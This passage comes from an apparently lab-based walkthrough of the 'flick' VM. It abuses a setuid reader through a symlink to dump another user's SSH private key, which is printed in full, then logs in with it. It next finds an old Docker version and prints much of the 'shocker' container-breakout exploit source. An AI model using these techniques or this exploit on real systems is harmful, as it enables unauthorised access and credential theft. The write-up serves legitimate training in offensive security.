</span><span class='line'>RUN apt-get update <span class="o">&amp;&amp;</span> apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli <span class="o">&amp;&amp;</span> apt-get clean <span class="o">&amp;&amp;</span> rm -rf /var/lib/apt/lists/*
</span><span class='line'>
</span><span class='line'>CMD <span class="o">[</span><span class="s2">&quot;/usr/sbin/apache2&quot;</span>, <span class="s2">&quot;-D&quot;</span>, <span class="s2">&quot;FOREGROUND&quot;</span><span class="o">]</span>
</span><span class='line'>dean@flick:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>After messing around reading files I created in varying directories, I decided to fool the application into reading a symlink to an arbitrary file on the filesystem - my first attempt was /home/robin/.ssh/id_rsa. Might as well start somewhere, right ? I was fully expecting this to fail, as I had no idea if the target file actually existed.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>dean@flick:~<span class="nv">$ </span>ln -s /home/robin/.ssh/id_rsa /home/dean/Dockerfile
</span><span class='line'>dean@flick:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 16
</span><span class='line'>lrwxrwxrwx <span class="m">1</span> dean  dean    <span class="m">23</span> Aug <span class="m">11</span> 23:10 Dockerfile -&gt; /home/robin/.ssh/id_rsa
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root  root  <span class="m">1250</span> Aug  <span class="m">4</span> 12:56 message.txt
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> robin robin <span class="m">8987</span> Aug  <span class="m">4</span> 14:45 read_docker
</span><span class='line'>dean@flick:~<span class="nv">$ </span>./read_docker ./
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
</span><span class='line'>ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
</span><span class='line'>FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
</span><span class='line'>S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
</span><span class='line'>CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
</span><span class='line'>d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
</span><span class='line'>jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
</span><span class='line'>wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
</span><span class='line'>tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
</span><span class='line'>Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
</span><span class='line'>wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
</span><span class='line'>mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
</span><span class='line'>l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
</span><span class='line'>JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
</span><span class='line'>gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
</span><span class='line'>JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
</span><span class='line'>rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
</span><span class='line'>PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
</span><span class='line'>zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
</span><span class='line'>AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
</span><span class='line'>EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
</span><span class='line'>mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
</span><span class='line'>JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
</span><span class='line'>Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
</span><span class='line'>VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span><span class='line'>dean@flick:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://cdn.gifbay.com/2012/10/what_the_hell_just_happened-7962.gif" alt="" /></p>

<p>OK, so, I&rsquo;ll put that into a file then and log in as Robin.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>dean@flick:~<span class="nv">$ </span>./read_docker ./ &gt; robin.priv
</span><span class='line'>dean@flick:~<span class="nv">$ </span>chmod <span class="m">600</span> ./robin.priv
</span><span class='line'>dean@flick:~<span class="nv">$ </span>ssh -i robin.priv robin@127.0.0.1
</span><span class='line'>
</span><span class='line'> .o88o. oooo   o8o            oooo
</span><span class='line'> <span class="m">888</span> <span class="sb">`</span><span class="s2">&quot; `888   `&quot;</span><span class="s1">&#39;            `888</span>
</span><span class='line'><span class="s1">o888oo   888  oooo   .ooooo.   888  oooo</span>
</span><span class='line'><span class="s1"> 888     888  `888  d88&#39;</span> <span class="sb">`</span><span class="err">&quot;</span>Y8  <span class="m">888</span> .8P<span class="s1">&#39;</span>
</span><span class='line'><span class="s1"> 888     888   888  888        888888.</span>
</span><span class='line'><span class="s1"> 888     888   888  888   .o8  888 `88b.</span>
</span><span class='line'><span class="s1">o888o   o888o o888o `Y8bod8P&#39;</span> o888o o888o
</span><span class='line'>
</span><span class='line'>Welcome to Ubuntu 12.04.4 LTS <span class="o">(</span>GNU/Linux 3.11.0-15-generic x86_64<span class="o">)</span>
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>  System information as of Wed Aug <span class="m">13</span> 00:31:14 SAST 2014
</span><span class='line'>
</span><span class='line'>  System load:  0.0               Processes:              91
</span><span class='line'>  Usage of /:   39.7% of 6.99GB   Users logged in:        1
</span><span class='line'>  Memory usage: 51%               IP address <span class="k">for</span> eth0:    192.168.0.106
</span><span class='line'>  Swap usage:   1%                IP address <span class="k">for</span> docker0: 172.17.42.1
</span><span class='line'>
</span><span class='line'>  Graph this data and manage this system at:
</span><span class='line'>    https://landscape.canonical.com/
</span><span class='line'>
</span><span class='line'><span class="m">79</span> packages can be updated.
</span><span class='line'><span class="m">51</span> updates are security updates.
</span><span class='line'>
</span><span class='line'>New release <span class="s1">&#39;14.04.1 LTS&#39;</span> available.
</span><span class='line'>Run <span class="s1">&#39;do-release-upgrade&#39;</span> to upgrade to it.
</span><span class='line'>
</span><span class='line'>Last login: Wed Aug <span class="m">13</span> 00:16:47 <span class="m">2014</span> from 192.168.0.110
</span><span class='line'>robin@flick:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<hr />

<h2>Docker all the Things !</h2>

<p>Robin can sudo /opt/start_apache/restart.sh without a password, as shown by running sudo -l</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for</span> robin on this host:
</span><span class='line'>    env_reset, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User robin may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/start_apache/restart.sh
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>This shell script seems to restart the Apache servers when run</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>sudo /opt/start_apache/restart.sh
</span><span class='line'> * Restarting web server apache2                                                                                        apache2: Could not reliably determine the server<span class="s1">&#39;s fully qualified domain name, using 127.0.1.1 for ServerName</span>
</span><span class='line'><span class="s1"> ... waiting apache2: Could not reliably determine the server&#39;</span>s fully qualified domain name, using 127.0.1.1 <span class="k">for</span> ServerName
</span><span class='line'>                                                                                                                 <span class="o">[</span> OK <span class="o">]</span>
</span><span class='line'>start_apache-8000: stopped
</span><span class='line'>start_apache-8000: started
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>The file cannot be viewed, as the permissions prevent it</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>ls -l /opt/start_apache/
</span><span class='line'>total 8
</span><span class='line'>-rwx------ <span class="m">1</span> root root   <span class="m">79</span> Aug  <span class="m">4</span> 17:04 restart.sh
</span><span class='line'>-rwx------ <span class="m">1</span> root root <span class="m">2285</span> Aug  <span class="m">4</span> 17:09 start.py
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>There&rsquo;s got to be another way to read that file to see what it&rsquo;s doing. Further poking around resulted in me finding out that Docker is installed (Docker is quite cool - take a look). However, as with any application, there are vulnerabilities.</p>

<p>The docker version command shows us the server is running version 0.11</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>docker version
</span><span class='line'>Client version: 0.11.0
</span><span class='line'>Client API version: 1.11
</span><span class='line'>Go version <span class="o">(</span>client<span class="o">)</span>: go1.2.1
</span><span class='line'>Git commit <span class="o">(</span>client<span class="o">)</span>: 15209c3
</span><span class='line'>Server version: 0.11.0
</span><span class='line'>Server API version: 1.11
</span><span class='line'>Git commit <span class="o">(</span>server<span class="o">)</span>: 15209c3
</span><span class='line'>Go version <span class="o">(</span>server<span class="o">)</span>: go1.2.1
</span><span class='line'>Last stable version: 1.1.2, please update docker
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which, according to <a href="http://blog.docker.com/2014/06/docker-container-breakout-proof-of-concept-exploit/">this site</a>, is vulnerable to a container breakout. The blog indicates that there is PoC code out in the wild - so off I went to find it. Turns out it&rsquo;s <a href="https://github.com/gabrtv/shocker">on github</a>, obviously.</p>

<p>OK, so lets clone the repo to the local machine and have a look at the code</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>git clone https://github.com/gabrtv/shocker
</span><span class='line'>Cloning into <span class="s1">&#39;shocker&#39;</span>...
</span><span class='line'>remote: Counting objects: 27, <span class="k">done</span>.
</span><span class='line'>remote: Total <span class="m">27</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>
</span><span class='line'>Unpacking objects: 100% <span class="o">(</span>27/27<span class="o">)</span>, <span class="k">done</span>.
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* shocker: docker PoC VMM-container breakout (C) 2014 Sebastian Krahmer</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * Demonstrates that any given docker image someone is asking</span>
</span><span class='line'><span class="cm"> * you to run in your docker setup can access ANY file on your host,</span>
</span><span class='line'><span class="cm"> * e.g. dumping hosts /etc/shadow or other sensitive info, compromising</span>
</span><span class='line'><span class="cm"> * security of the host and any other docker VM&#39;s on it.</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * docker using container based VMM: Sebarate pid and net namespace,</span>
</span><span class='line'><span class="cm"> * stripped caps and RO bind mounts into container&#39;s /. However</span>
</span><span class='line'><span class="cm"> * as its only a bind-mount the fs struct from the task is shared</span>
</span><span class='line'><span class="cm"> * with the host which allows to open files by file handles</span>
</span><span class='line'><span class="cm"> * (open_by_handle_at()). As we thankfully have dac_override and</span>
</span><span class='line'><span class="cm"> * dac_read_search we can do this. The handle is usually a 64bit</span>
</span><span class='line'><span class="cm"> * string with 32bit inodenumber inside (tested with ext4).</span>
</span><span class='line'><span class="cm"> * Inode of / is always 2, so we have a starting point to walk</span>
</span><span class='line'><span class="cm"> * the FS path and brute force the remaining 32bit until we find the</span>
</span><span class='line'><span class="cm"> * desired file (It&#39;s probably easier, depending on the fhandle export</span>
</span><span class='line'><span class="cm"> * function used for the FS in question: it could be a parent inode# or</span>
</span><span class='line'><span class="cm"> * the inode generation which can be obtained via an ioctl).</span>
</span><span class='line'><span class="cm"> * [In practise the remaining 32bit are all 0 :]</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * tested with docker 0.11 busybox demo image on a 3.11 kernel:</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * docker run -i busybox sh</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * seems to run any program inside VMM with UID 0 (some caps stripped); if</span>
</span><span class='line'><span class="cm"> * user argument is given, the provided docker image still</span>
</span><span class='line'><span class="cm"> * could contain +s binaries, just as demo busybox image does.</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * PS: You should also seccomp kexec() syscall :)</span>
</span><span class='line'><span class="cm"> * PPS: Might affect other container based compartments too</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * $ cc -Wall -std=c99 -O2 shocker.c -static</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define _GNU_SOURCE</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/stat.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;dirent.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdint.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">my_file_handle</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">handle_bytes</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">handle_type</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">f_handle</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">die</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">perror</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
</span><span class='line'>  <span class="n">exit</span><span class="p">(</span><span class="n">errno</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">dump_handle</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">my_file_handle</span> <span class="o">*</span><span class="n">h</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&quot;[*] #=%d, %d, char nh[] = {&quot;</span><span class="p">,</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">handle_bytes</span><span class="p">,</span>
</span><span class='line'>          <span class="n">h</span><span class="o">-&gt;</span><span class="n">handle_type</span><span class="p">);</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">handle_bytes</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&quot;0x%02x&quot;</span><span class="p">,</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">f_handle</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">20</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>          <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">handle_bytes</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>          <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&quot;, &quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&quot;};</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">find_handle</span><span class="p">(</span><span class="kt">int</span> <span class="n">bfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">my_file_handle</span> <span class="o">*</span><span class="n">ih</span><span class="p">,</span> <span class="k">struct</span> <span class="n">my_file_handle</span> <span class="o">*</span><span class="n">oh</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">uint32_t</span> <span class="n">ino</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">my_file_handle</span> <span class="n">outh</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>      <span class="p">.</span><span class="n">handle_bytes</span> <span class="o">=</span> <span class="mi">8</span><span class="p">,</span>
</span><span class='line'>      <span class="p">.</span><span class="n">handle_type</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="p">};</span>
</span><span class='line'>  <span class="kt">DIR</span> <span class="o">*</span><span class="n">dir</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">de</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">path</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// recursion stops if path has been resolved</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">path</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">memcpy</span><span class="p">(</span><span class="n">oh</span><span class="o">-&gt;</span><span class="n">f_handle</span><span class="p">,</span> <span class="n">ih</span><span class="o">-&gt;</span><span class="n">f_handle</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">oh</span><span class="o">-&gt;</span><span class="n">f_handle</span><span class="p">));</span>
</span><span class='line'>      <span class="n">oh</span><span class="o">-&gt;</span><span class="n">handle_type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
